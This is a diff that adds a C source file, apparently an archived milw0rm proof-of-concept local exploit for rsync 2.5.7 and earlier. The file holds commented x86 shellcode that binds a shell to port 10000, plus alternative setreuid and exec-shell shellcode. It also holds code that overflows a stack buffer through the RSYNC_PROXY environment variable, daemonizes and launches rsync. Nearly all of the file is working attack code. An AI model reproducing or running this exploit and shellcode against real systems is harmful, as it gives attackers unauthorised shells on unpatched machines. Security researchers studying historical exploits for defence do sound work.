@@ -1,0 +1,159 @@
+/* 
+* rsync <= 2.5.7 Local Exploit
+* Saved EIP on stack is overwritten with address of shellcode in memory
+* Generally rsync is not setuid or setgid so just a local shell is of no use
+* So i used a portbinding shellcode as a PoC of a different attack vector.
+* RET is calculated dynamically so payload can be changed just by changing shellcode
+* Tested on:
+* [eos@Matrix my]$ uname -a
+* Linux Matrix 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux
+* coded by: abhisek linuxmail org
+* Special Thanks: n2n, Hirosh Joseph
+*/
+
+#include <stdio.h>
+/* Includes for code to daemonize */
+#include <signal.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+/****/
+#define PATH "/usr/local/bin/rsync"
+#define BUFF_SIZE 100
+//#define RET 0xbffffdfb
+
+/* 88 bytes portbinding shellcode - linux-x86
+* - by bighawk (bighawk warfare com)
+*
+* This shellcode binds a shell on port 10000
+* stdin, stdout and stderr are dupped. accept() arguments are sane.
+*/
+char shellcode[] =
+"\x31\xdb" // xor ebx, ebx
+"\xf7\xe3" // mul ebx
+"\xb0\x66" // mov al, 102
+"\x53" // push ebx
+"\x43" // inc ebx
+"\x53" // push ebx
+"\x43" // inc ebx
+"\x53" // push ebx
+"\x89\xe1" // mov ecx, esp
+"\x4b" // dec ebx
+"\xcd\x80" // int 80h
+"\x89\xc7" // mov edi, eax
+"\x52" // push edx
+"\x66\x68\x27\x10" // push word 4135
+"\x43" // inc ebx
+"\x66\x53" // push bx
+"\x89\xe1" // mov ecx, esp
+"\xb0\x10" // mov al, 16
+"\x50" // push eax
+"\x51" // push ecx
+"\x57" // push edi
+"\x89\xe1" // mov ecx, esp
+"\xb0\x66" // mov al, 102
+"\xcd\x80" // int 80h
+"\xb0\x66" // mov al, 102
+"\xb3\x04" // mov bl, 4
+"\xcd\x80" // int 80h
+"\x50" // push eax
+"\x50" // push eax
+"\x57" // push edi
+"\x89\xe1" // mov ecx, esp
+"\x43" // inc ebx
+"\xb0\x66" // mov al, 102
+"\xcd\x80" // int 80h
+"\x89\xd9" // mov ecx, ebx
+"\x89\xc3" // mov ebx, eax
+"\xb0\x3f" // mov al, 63
+"\x49" // dec ecx
+"\xcd\x80" // int 80h
+"\x41" // inc ecx
+"\xe2\xf8" // loop lp
+"\x51" // push ecx
+"\x68\x6e\x2f\x73\x68" // push dword 68732f6eh
+"\x68\x2f\x2f\x62\x69" // push dword 69622f2fh
+"\x89\xe3" // mov ebx, esp
+"\x51" // push ecx
+"\x53" // push ebx
+"\x89\xe1" // mov ecx, esp
+"\xb0\x0b" // mov al, 11
+"\xcd\x80"; // int 80h
+/* Shellcode by n2n [n2n@linuxmail.org] used for initial testing */
+/*
+char shellcode[]=
+// setreuid(geteuid(),geteuid()), no use unless rsync is setuid, usually its not 
+"\x31\xc0\xb0\x31\xcd\x80\x93\x89\xd9\x31\xc0\xb0\x46\xcd\x80"
+// setregid(getegid(),getegid()) 
+"\x31\xc0\xb0\x32\xcd\x80\x93\x89\xd9\x31\xc0\xb0\x47\xcd\x80"
+// exec /bin/sh 
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+// exit() 
+"\x31\xdb\x89\xd8\xb0\x01\xcd\x80";
+*/
+void handler(int sig) {
+int stat;
+pid_t pid;
+while ((pid = waitpid(-1, &stat, WNOHANG)) > 0) { }
+return;
+}
+void go_daemon() {
+int i;
+if(fork())
+exit (0);
+setsid();
+i=open("/dev/null",O_RDWR);
+dup2(i, 0);
+dup2(i, 1);
+dup2(i, 2);
+close(i);
+for (i=1;i<64;i++)
+signal(i,SIG_IGN);
+signal(SIGCHLD,handler);
+}
+int main(int argc,char *argv[]) {
+char *buffer;
+int size=BUFF_SIZE,i;
+//unsigned long ret_addr=0xbffffffa;
+unsigned long ret_addr=0xbffffffa;
+//char *expbuff;
+char *arg="localhost::rsync:getaddrinfo:XXX";
+if(argc > 2) {
+printf("USAGE:\n%s BUFF_SIZE\n",argv[0]);
+exit(1);
+}
+if(argc == 2)
+size=atoi(argv[1]);
+buffer=(char*)malloc(size);
+if(!buffer) {
+printf("Error allocating memory on heap\n");
+exit(1);
+}
+ret_addr -= strlen(PATH);
+ret_addr -= strlen(shellcode);
+//ret_addr -= strlen(arg);
+/*
+expbuff=(char*)malloc(strlen(shellcode)+100);
+if(!expbuff) {
+printf("Error allocating memory on heap\n");
+exit(1);
+}
+memset(expbuff,0x90,strlen(shellcode)+100);
+memcpy(expbuff+80,shellcode,strlen(shellcode));
+expbuff[strlen(expbuff)-1]=0x00;
+*/
+for(i=0;i<size;i+=4) 
+*(unsigned long*)(buffer+i)=ret_addr; 
+memcpy(buffer,"XXX:",4);
+buffer[strlen(buffer)-1]=0x00;
+printf("Using BUFF_SIZE=%d\nRET=%p\n",size,ret_addr);
+setenv("RSYNC_PROXY",buffer,1);
+setenv("EGG",shellcode,1);
+/* Daemonizing and executing /usr/local/bin/rsync */
+go_daemon();
+execl(PATH,PATH,arg,NULL);
+return 0;
+}
+
+
+// milw0rm.com [2004-02-13]
